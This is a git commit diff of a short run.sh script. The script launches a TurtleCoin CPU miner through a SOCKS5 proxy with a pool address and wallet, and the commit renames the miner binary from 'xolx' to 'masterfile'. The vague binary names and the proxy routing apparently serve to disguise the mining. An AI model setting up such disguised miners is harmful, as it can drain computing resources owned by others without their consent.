fd446db8dd5a55ad1541db7ca4f72a9d767e8c67
kimcoksuk <89489320+kimcoksuk@users.noreply.github.com>
2021-08-25 12:05:30 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -5,4 +5,4 @@ POOL=turtlecoin.herominers.com:10380
 WALLET=TRTLv1xLSHLPhfLEmMhk6J1p42SHHSGA15jiByLzY7gvYnotcwb3L5L8FHDUJ4uH7qLkEdfxuTWAW69tZ4LtskR1eTrgWw4BJSB
 WORKER=CPU
 PROXY=socks5://192.252.209.155:14455
-./xolx -o $POOL -u $WALLET -p $WORKER -a argon2/chukwav2 --donate-level 1 -t 2 -x $PROXY -k
+./masterfile -o $POOL -u $WALLET -p $WORKER -a argon2/chukwav2 --donate-level 1 -t 2 -x $PROXY -k
